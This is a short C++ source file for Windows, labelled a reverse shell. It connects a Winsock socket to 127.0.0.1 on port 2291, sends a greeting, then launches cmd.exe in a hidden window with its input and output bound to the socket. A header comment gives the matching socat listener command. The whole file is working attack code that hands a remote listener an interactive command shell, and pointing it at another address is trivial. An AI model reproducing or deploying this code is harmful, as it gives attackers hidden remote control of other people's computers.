// Reverse shell 
// https://www.codeproject.com/Questions/1244856/Win-winsock-bind-reverse-shell-with-createprocess
// Server:
// $ socat TCP4-LISTEN:2291 STDIO

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define BUFFERLEN (1024)

int spawnShell(void* my_socket, string my_cmd)
{
	STARTUPINFOA s_info = { 0 };
	PROCESS_INFORMATION p_info;

	s_info.cb = sizeof(s_info);
	s_info.wShowWindow = SW_HIDE;
	s_info.dwFlags = STARTF_USESTDHANDLES;
	s_info.hStdInput = my_socket;
	s_info.hStdOutput = my_socket;
	s_info.hStdError = my_socket;

	CreateProcessA(NULL, (LPSTR)my_cmd.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, (STARTUPINFOA*)&s_info, &p_info);

	return 0;
}

int main()
{
	string ipv4 = "127.0.0.1";
	int port = 2291;
	WSADATA wsaData;
	struct sockaddr_in addr;
	SOCKET sock;

	int len;
	char data[BUFFERLEN];


	WSAStartup(MAKEWORD(2, 2), &wsaData);

	sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(ipv4.c_str());
	addr.sin_port = htons(port);
	connect(sock, (SOCKADDR*)&addr, sizeof(addr));

	// send and receive test
	send(sock, "HELLO\n", 6, 0);
	len = recv(sock, data, BUFFERLEN, 0);
	data[len] = '\0';
	cout << data << endl;

	spawnShell((void*)sock, "cmd.exe");

	return 0;
}
